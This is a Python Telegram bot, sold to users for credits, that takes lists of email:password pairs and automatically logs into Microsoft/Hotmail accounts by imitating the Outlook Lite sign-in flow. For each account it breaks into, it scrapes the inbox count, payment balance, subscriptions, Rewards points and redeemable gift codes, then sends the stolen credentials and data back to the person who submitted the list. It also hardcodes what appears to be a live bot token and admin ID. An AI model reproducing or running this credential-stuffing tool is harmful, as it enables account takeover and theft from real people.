#!/usr/bin/env python3
"""Hotmail Checker Bot - Enhanced Version"""

import re, json, uuid, sqlite3, logging, asyncio, time, os
from datetime import datetime
from urllib.parse import quote, unquote
import requests, urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings()
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Config - Recommended to use environment variables
BOT_TOKEN = os.getenv("BOT_TOKEN", "8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak")
ADMIN_ID = int(os.getenv("ADMIN_ID", "5944410248"))
DB = "checker.db"

class Database:
    def __init__(self):
        conn = sqlite3.connect(DB)
        try:
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, has_access INTEGER DEFAULT 0, credits INTEGER DEFAULT 0, total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0, joined_date TEXT, is_banned INTEGER DEFAULT 0)''')
            c.execute('''CREATE TABLE IF NOT EXISTS results (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, email TEXT, status TEXT, details TEXT, date TEXT)''')

            # Migration: check if 'details' column exists in 'results' table
            c.execute("PRAGMA table_info(results)")
            columns = [column[1] for column in c.fetchall()]
            if 'details' not in columns:
                logger.info("Migrating database: adding 'details' column to 'results' table")
                c.execute("ALTER TABLE results ADD COLUMN details TEXT")

            conn.commit()
        finally:
            conn.close()
    
    def add_user(self, uid, uname, fname):
        conn = sqlite3.connect(DB)
        try:
            c = conn.cursor()
            c.execute('INSERT OR IGNORE INTO users (user_id, username, first_name, joined_date) VALUES (?, ?, ?, ?)', (uid, uname or "", fname or "", datetime.now().isoformat()))
            conn.commit()
        finally:
            conn.close()
    
    def has_access(self, uid):
        if uid == ADMIN_ID: return True
        conn = sqlite3.connect(DB)
        try:
            c = conn.cursor()
            c.execute('SELECT has_access FROM users WHERE user_id = ?', (uid,))
            r = c.fetchone()
            return r and r[0] == 1
        finally:
            conn.close()
    
    def is_banned(self, uid):
        conn = sqlite3.connect(DB)
        try:
            c = conn.cursor()
            c.execute('SELECT is_banned FROM users WHERE user_id = ?', (uid,))
            r = c.fetchone()
            return r and r[0] == 1
        finally:
            conn.close()
    
    def grant(self, uid, creds=10):
        conn = sqlite3.connect(DB)
        try:
            c = conn.cursor()
            c.execute('''INSERT OR REPLACE INTO users (user_id, username, first_name, has_access, credits, joined_date, total_checks, total_hits, is_banned) VALUES (?, ?, ?, 1, ?, COALESCE((SELECT joined_date FROM users WHERE user_id = ?), ?), COALESCE((SELECT total_checks FROM users WHERE user_id = ?), 0), COALESCE((SELECT total_hits FROM users WHERE user_id = ?), 0), 0)''', (uid, f"user_{uid}", f"User{uid}", creds, uid, datetime.now().isoformat(), uid, uid))
            conn.commit()
        finally:
            conn.close()
    
    def revoke(self, uid):
        conn = sqlite3.connect(DB)
        try:
            c = conn.cursor()
            c.execute('UPDATE users SET has_access = 0 WHERE user_id = ?', (uid,))
            conn.commit()
        finally:
            conn.close()
    
    def get_credits(self, uid):
        conn = sqlite3.connect(DB)
        try:
            c = conn.cursor()
            c.execute('SELECT credits FROM users WHERE user_id = ?', (uid,))
            r = c.fetchone()
            return r[0] if r else 0
        finally:
            conn.close()
    
    def add_credits(self, uid, amt):
        conn = sqlite3.connect(DB)
        try:
            c = conn.cursor()
            c.execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (amt, uid))
            conn.commit()
        finally:
            conn.close()
    
    def use_credit(self, uid):
        conn = sqlite3.connect(DB)
        try:
            c = conn.cursor()
            c.execute('UPDATE users SET credits = credits - 1 WHERE user_id = ?', (uid,))
            conn.commit()
        finally:
            conn.close()
    
    def save_result(self, uid, email, status, details):
        conn = sqlite3.connect(DB)
        try:
            c = conn.cursor()
            details_json = json.dumps(details)
            c.execute('INSERT INTO results (user_id, email, status, details, date) VALUES (?, ?, ?, ?, ?)', (uid, email, status, details_json, datetime.now().isoformat()))
            if status == 'hit':
                c.execute('UPDATE users SET total_checks = total_checks + 1, total_hits = total_hits + 1 WHERE user_id = ?', (uid,))
            else:
                c.execute('UPDATE users SET total_checks = total_checks + 1 WHERE user_id = ?', (uid,))
            conn.commit()
        finally:
            conn.close()
    
    def get_stats(self):
        conn = sqlite3.connect(DB)
        try:
            c = conn.cursor()
            c.execute('SELECT COUNT(*) FROM users')
            t = c.fetchone()[0]
            c.execute('SELECT COUNT(*) FROM users WHERE has_access = 1')
            a = c.fetchone()[0]
            c.execute('SELECT SUM(total_checks) FROM users')
            ch = c.fetchone()[0] or 0
            c.execute('SELECT SUM(total_hits) FROM users')
            h = c.fetchone()[0] or 0
            return {'total': t, 'active': a, 'checks': ch, 'hits': h}
        finally:
            conn.close()

    def user_stats(self, uid):
        conn = sqlite3.connect(DB)
        try:
            c = conn.cursor()
            c.execute('SELECT total_checks, total_hits, credits FROM users WHERE user_id = ?', (uid,))
            r = c.fetchone()
            return {'checks': r[0], 'hits': r[1], 'credits': r[2]} if r else {'checks': 0, 'hits': 0, 'credits': 0}
        finally:
            conn.close()

class Checker:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.uuid = str(uuid.uuid4())
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept-Language": "en-US,en;q=0.9",
        }
    
    def extract_inbox_count(self, text):
        try:
            patterns = [
                r'"DisplayName":"Inbox","TotalCount":(\d+)',
                r'"TotalCount":(\d+)',
                r'Inbox","TotalCount":(\d+)'
            ]
            for pattern in patterns:
                match = re.search(pattern, text)
                if match: return int(match.group(1))
        except: pass
        return 0

    def get_remaining_days(self, date_str):
        try:
            if not date_str: return "0"
            renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            return str(remaining)
        except: return "0"

    def parse_country_from_json(self, json_data):
        try:
            if isinstance(json_data, dict):
                if "accounts" in json_data and isinstance(json_data["accounts"], list):
                    for account in json_data["accounts"]:
                        if isinstance(account, dict) and "location" in account and account["location"]:
                            return str(account["location"]).strip()
                if "location" in json_data and json_data["location"]:
                    location = json_data["location"]
                    if isinstance(location, str):
                        parts = [p.strip() for p in location.split(',')]
                        return parts[-1] if parts else ""
                    elif isinstance(location, dict):
                        for key in ['country', 'countryOrRegion', 'countryCode']:
                            if key in location and location[key]: return str(location[key])
                for key in ['country', 'countryOrRegion', 'countryCode', 'Country']:
                    if key in json_data and json_data[key]: return str(json_data[key])
        except: pass
        return "Unknown"

    def parse_name_from_json(self, json_data):
        try:
            if isinstance(json_data, dict):
                if "displayName" in json_data and json_data["displayName"]:
                    return str(json_data["displayName"])
                for key in ['name', 'givenName', 'fullName']:
                    if key in json_data and json_data[key]: return str(json_data[key])
        except: pass
        return "Unknown"

    def check_microsoft_subscriptions(self, email, access_token, cid):
        sub_data = {'balance': 'N/A', 'rewards_points': 0, 'subscriptions': []}
        try:
            # Payment Token
            state_json = json.dumps({"userId": str(uuid.uuid4()).replace('-', '')[:16], "scopeSet": "pidl"})
            payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state_json) + "&prompt=none"
            r = self.session.get(payment_auth_url, headers={"Referer": "https://account.microsoft.com/"}, timeout=15)

            payment_token = None
            search_text = r.text + " " + r.url
            token_match = re.search(r'access_token=([^&\s"\']+)', search_text)
            if token_match: payment_token = unquote(token_match.group(1))

            if payment_token:
                payment_headers = {
                    "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                    "Accept": "application/json",
                    "Origin": "https://account.microsoft.com",
                    "Referer": "https://account.microsoft.com/"
                }
                # Balance
                r_pay = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US", headers=payment_headers, timeout=10)
                balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r_pay.text)
                if balance_match: sub_data['balance'] = "$" + balance_match.group(1)

                # Subscriptions
                r_sub = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions", headers=payment_headers, timeout=10)
                if r_sub.status_code == 200:
                    keywords = {'Xbox Game Pass': 'Game Pass', 'Microsoft 365': 'M365', 'Office 365': 'Office 365', 'OneDrive': 'OneDrive'}
                    for kw, name in keywords.items():
                        if kw in r_sub.text: sub_data['subscriptions'].append(name)

            # Rewards
            rewards_r = self.session.get("https://rewards.bing.com/", timeout=10)
            points_match = re.search(r'"availablePoints"\s*:\s*(\d+)', rewards_r.text)
            if points_match: sub_data['rewards_points'] = int(points_match.group(1))

        except: pass
        return sub_data

    def get_rewards_codes(self, email):
        codes = []
        exclude_words = {
            'SWEEPSTAKES', 'STATUS', 'WINORDER', 'CONTEST', 'PLAGUE', 'REQUIEM',
            'CUSTOM', 'BUNDLEORDER', 'SURFACE', 'PROORDER', 'SERIES', 'POINTS',
            'DONATION', 'CHILDREN', 'RESEARCH', 'HOSPITALORDE', 'EDUCATION',
            'EMPLOYMENTOR', 'RIGHTS', 'YOUORDER', 'SEDSORDER', 'ATAORDER',
            'CARDORDER', 'MICROSOFT', 'PRESENTKORT', 'KRORDER', 'OFT-PRE',
            'DIGITAL', 'COINSORDER', 'MOEDAS', 'OVERWATCHORD', 'MONEDASORDER',
            'ASSINATURA', 'GRATUITA', 'SPOTIFY', 'PREMIUM', 'MESESORDER',
            'PRESENTE', 'RESALET', 'NOURORDER', 'FOUNDATIONOR', 'YACOUB',
            'LEAGUE', 'LEGENDS', 'RPORDER', 'OVERWATCH', 'GAME', 'PASS',
        }
        try:
            url = 'https://rewards.bing.com/redeem/orderhistory'
            r = self.session.get(url, headers={'Referer': 'https://rewards.bing.com/'}, timeout=15)
            if 'fmHF' in r.text or 'JavaScript required to sign in' in r.text:
                soup = BeautifulSoup(r.text, 'html.parser')
                form = soup.find('form', id='fmHF') or soup.find('form', attrs={'name': 'fmHF'})
                if form:
                    data = {inp.get('name'): inp.get('value', '') for inp in form.find_all('input') if inp.get('name')}
                    action = form.get('action', '')
                    if action.startswith('/'): action = 'https://login.live.com' + action
                    self.session.post(action, data=data, timeout=10)
                    r = self.session.get(url, timeout=10)

            soup = BeautifulSoup(r.text, 'html.parser')
            # Look specifically in the table if it exists
            table = soup.find('table', class_='table')
            if table:
                search_area = table.get_text()
            else:
                search_area = soup.get_text()

            code_patterns = [
                r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',
                r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',
                r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b'
            ]
            for pattern in code_patterns:
                found = re.findall(pattern, search_area)
                for c in found:
                    if not any(word in c for word in exclude_words):
                        codes.append(c)
        except: pass
        return list(set(codes))

    def check(self, email, password):
        result = {'email': email, 'status': 'bad', 'inbox': 0, 'points': 0, 'country': 'N/A', 'name': 'N/A', 'subs': [], 'codes': []}
        try:
            # 1. Get IDP
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            h1 = {"X-OneAuth-AppName": "Outlook Lite", "X-Office-Version": "3.11.0-minApi24", "X-CorrelationId": self.uuid, "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)"}
            r1 = self.session.get(url1, headers=h1, timeout=15)
            if "MSAccount" not in r1.text or any(x in r1.text for x in ["Neither", "Both"]): return result
            
            # 2. Authorize
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            r2 = self.session.get(url2, headers=self.headers, timeout=15)

            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match: return result

            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            # 3. Login POST
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            h3 = {"Content-Type": "application/x-www-form-urlencoded", "Referer": r2.url}
            r3 = self.session.post(post_url, data=login_data, headers=h3, allow_redirects=False, timeout=15)
            
            if "account or password is incorrect" in r3.text.lower() or "error" in r3.text.lower(): return result
            if "identity/confirm" in r3.text.lower() or "consent" in r3.text.lower():
                result['status'] = '2fa'
                return result
            if "abuse" in r3.text:
                result['status'] = 'locked'
                return result
            
            location = r3.headers.get("Location", "")
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match: return result
            
            code = code_match.group(1)
            cid = self.session.cookies.get("MSPCID", "").upper()
            
            # 4. Get Token
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
            
            if "access_token" not in r4.text: return result
            access_token = r4.json()["access_token"]
            result['status'] = 'hit'

            # 5. Profile & Inbox & Subscriptions
            profile_headers = {"Authorization": f"Bearer {access_token}", "X-AnchorMailbox": f"CID:{cid}"}
            try:
                r5 = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=profile_headers, timeout=10)
                if r5.status_code == 200:
                    prof = r5.json()
                    result['country'] = self.parse_country_from_json(prof)
                    result['name'] = self.parse_name_from_json(prof)
            except: pass
            
            try:
                h_inbox = {"Authorization": f"Bearer {access_token}", "x-owa-sessionid": str(uuid.uuid4()), "action": "StartupData"}
                r_inbox = self.session.post(f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0", headers=h_inbox, timeout=15)
                result['inbox'] = self.extract_inbox_count(r_inbox.text)
            except: pass
            
            ms_info = self.check_microsoft_subscriptions(email, access_token, cid)
            result['points'] = ms_info['rewards_points']
            result['subs'] = ms_info['subscriptions']

            if result['points'] > 0:
                result['codes'] = self.get_rewards_codes(email)

            return result
        except:
            result['status'] = 'error'
            return result

db = Database()

async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
    user = u.effective_user
    db.add_user(user.id, user.username, user.first_name)
    if db.is_banned(user.id):
        await u.message.reply_text("❌ You are banned from using this bot.")
        return

    welcome_text = (
        f"👋 Hello {user.first_name}!\n\n"
        f"🚀 Welcome to the **Premium Hotmail Checker**.\n"
        f"I can check Hotmail accounts for Inbox count, Rewards points, Subscriptions, and even extract gift codes!\n\n"
        f"💳 Your Credits: `{db.get_credits(user.id)}`"
    )

    keyboard = [
        [InlineKeyboardButton("🔍 Check Combo", callback_data="check_start")],
        [InlineKeyboardButton("📊 My Stats", callback_data="my_stats"), InlineKeyboardButton("❓ Help", callback_data="help")]
    ]
    if user.id == ADMIN_ID:
        keyboard.append([InlineKeyboardButton("🛠 Admin Panel", callback_data="admin_panel")])

    await u.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def my_stats(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    s = db.user_stats(uid)
    text = (
        f"📊 **User Statistics**\n\n"
        f"👤 User ID: `{uid}`\n"
        f"💰 Credits: `{s['credits']}`\n"
        f"🔍 Total Checks: `{s['checks']}`\n"
        f"🎯 Total Hits: `{s['hits']}`"
    )
    await u.callback_query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]))

async def help_query(u: Update, c: ContextTypes.DEFAULT_TYPE):
    text = (
        "❓ **How to use**\n\n"
        "1. Click 'Check Combo' or send your list directly.\n"
        "2. Format: `email:password` (one per line).\n"
        "3. You can also upload a `.txt` file with the combo.\n\n"
        "✨ The bot will provide detailed info for every HIT!"
    )
    await u.callback_query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]))

async def admin_panel(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if u.effective_user.id != ADMIN_ID: return
    s = db.get_stats()
    text = (
        f"🛠 **Admin Panel**\n\n"
        f"👥 Total Users: `{s['total']}`\n"
        f"✅ Active Users: `{s['active']}`\n"
        f"🔍 Total Checks: `{s['checks']}`\n"
        f"🎯 Total Hits: `{s['hits']}`"
    )
    kb = [
        [InlineKeyboardButton("➕ Grant Access", callback_data="adm_grant"), InlineKeyboardButton("➖ Revoke Access", callback_data="adm_revoke")],
        [InlineKeyboardButton("💰 Add Credits", callback_data="adm_credits")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]
    ]
    await u.callback_query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))

async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if db.is_banned(uid) or not db.has_access(uid):
        await u.message.reply_text("❌ Access denied. Contact admin.")
        return

    # Handle text or file
    if u.message.document:
        if not u.message.document.file_name.endswith('.txt'):
            await u.message.reply_text("❌ Please upload a .txt file.")
            return
        file = await c.bot.get_file(u.message.document.file_id)
        content = await file.download_as_bytearray()
        text = content.decode('utf-8', errors='ignore')
    else:
        text = u.message.text

    lines = [l.strip() for l in text.split('\n') if ':' in l]
    if not lines:
        await u.message.reply_text("❌ No valid combo found. Format: `email:password`")
        return

    if uid != ADMIN_ID:
        cr = db.get_credits(uid)
        if cr < len(lines):
            await u.message.reply_text(f"❌ Not enough credits. You need `{len(lines)}`, but have `{cr}`.")
            return

    status_msg = await u.message.reply_text(f"🔄 **Starting Check...**\nTotal: `{len(lines)}`", parse_mode='Markdown')

    hits, bad, tfa, locked, err = 0, 0, 0, 0, 0
    results_file_path = f"hits_{uid}_{int(time.time())}.txt"

    for i, line in enumerate(lines, 1):
        try:
            email, pwd = line.split(':', 1)
            email, pwd = email.strip(), pwd.strip()
        except: continue

        checker = Checker()
        res = checker.check(email, pwd)
        db.save_result(uid, email, res['status'], res)

        if res['status'] == 'hit':
            hits += 1
            if uid != ADMIN_ID: db.use_credit(uid)

            hit_text = (
                f"🎯 **HIT!**\n"
                f"📧 Email: `{email}`\n"
                f"🔑 Pass: `{pwd}`\n"
                f"📬 Inbox: `{res['inbox']}`\n"
                f"💰 Points: `{res['points']}`\n"
                f"🌍 Country: `{res['country']}`\n"
                f"👤 Name: `{res['name']}`\n"
            )
            if res['subs']: hit_text += f"💳 Subs: `{', '.join(res['subs'])}`\n"
            if res['codes']: hit_text += f"🎁 Codes: `{', '.join(res['codes'])}`\n"

            await c.bot.send_message(chat_id=uid, text=hit_text, parse_mode='Markdown')

            with open(results_file_path, "a") as f:
                f.write(f"{email}:{pwd} | Inbox: {res['inbox']} | Points: {res['points']} | Country: {res['country']} | Subs: {res['subs']} | Codes: {res['codes']}\n")

        elif res['status'] == '2fa': tfa += 1
        elif res['status'] == 'bad': bad += 1
        elif res['status'] == 'locked': locked += 1
        else: err += 1

        # Update progress every account for better UI
        progress = (
            f"🔄 **Checking Progress**\n\n"
            f"📊 `[{'●' * int(i/len(lines)*10)}{'○' * (10 - int(i/len(lines)*10))}]` {int(i/len(lines)*100)}%\n\n"
            f"📈 Total: `{len(lines)}` | Checked: `{i}`\n"
            f"🎯 Hits: `{hits}`\n"
            f"💀 Bad: `{bad}`\n"
            f"🔒 2FA: `{tfa}`\n"
            f"🔓 Locked: `{locked}`\n"
            f"⚠️ Errors: `{err}`"
        )
        try:
            # Edit every 3 accounts or on important events to avoid telegram flood
            if i % 3 == 0 or i == len(lines) or res['status'] == 'hit':
                await status_msg.edit_text(progress, parse_mode='Markdown')
        except: pass

        await asyncio.sleep(1) # Rate limit protection

    await status_msg.delete()
    summary = (
        f"✅ **Check Completed!**\n\n"
        f"🎯 Hits: `{hits}`\n"
        f"❌ Bad: `{bad}`\n"
        f"🔒 2FA: `{tfa}`\n"
        f"🔓 Locked: `{locked}`\n"
        f"⚠️ Errors: `{err}`\n"
        f"📊 Total: `{len(lines)}`"
    )

    if os.path.exists(results_file_path):
        with open(results_file_path, 'rb') as f:
            await u.message.reply_document(document=f, caption=summary, parse_mode='Markdown')
        os.remove(results_file_path)
    else:
        await u.message.reply_text(summary, parse_mode='Markdown')

async def callback_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    q = u.callback_query
    await q.answer()
    data = q.data

    if data == "check_start":
        await q.message.reply_text("📝 Send me your combo in `email:password` format or upload a `.txt` file.")
    elif data == "my_stats":
        await my_stats(u, c)
    elif data == "help":
        await help_query(u, c)
    elif data == "admin_panel":
        await admin_panel(u, c)
    elif data == "back_to_start":
        # Simplified back to start
        user = q.from_user
        welcome_text = (
            f"👋 Hello {user.first_name}!\n\n"
            f"🚀 Welcome to the **Premium Hotmail Checker**.\n"
            f"💳 Your Credits: `{db.get_credits(user.id)}`"
        )
        keyboard = [
            [InlineKeyboardButton("🔍 Check Combo", callback_data="check_start")],
            [InlineKeyboardButton("📊 My Stats", callback_data="my_stats"), InlineKeyboardButton("❓ Help", callback_data="help")]
        ]
        if user.id == ADMIN_ID:
            keyboard.append([InlineKeyboardButton("🛠 Admin Panel", callback_data="admin_panel")])
        await q.edit_message_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    elif data.startswith("adm_"):
        if q.from_user.id != ADMIN_ID: return
        act = data.split("_")[1]
        c.user_data['admin_action'] = act
        if act == 'grant': await q.message.reply_text("Send `USER_ID CREDITS` to grant access.")
        elif act == 'revoke': await q.message.reply_text("Send `USER_ID` to revoke access.")
        elif act == 'credits': await q.message.reply_text("Send `USER_ID AMOUNT` to add credits.")

async def admin_message_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if u.effective_user.id != ADMIN_ID: return
    action = c.user_data.get('admin_action')
    if not action: return

    try:
        parts = u.message.text.split()
        if action == 'grant':
            uid, creds = int(parts[0]), int(parts[1])
            db.grant(uid, creds)
            await u.message.reply_text(f"✅ Granted access to `{uid}` with `{creds}` credits.", parse_mode='Markdown')
        elif action == 'revoke':
            uid = int(parts[0])
            db.revoke(uid)
            await u.message.reply_text(f"✅ Revoked access from `{uid}`.", parse_mode='Markdown')
        elif action == 'credits':
            uid, amt = int(parts[0]), int(parts[1])
            db.add_credits(uid, amt)
            await u.message.reply_text(f"✅ Added `{amt}` credits to `{uid}`.", parse_mode='Markdown')
        c.user_data['admin_action'] = None
    except Exception as e:
        await u.message.reply_text(f"❌ Error: {e}")

def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(callback_handler))

    # Handle combos (text and document)
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_combo))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.Regex(r':'), handle_combo))

    # Admin text handler
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.Regex(r':'), admin_message_handler))

    logger.info("Bot is running...")
    app.run_polling()

if __name__ == '__main__':
    main()
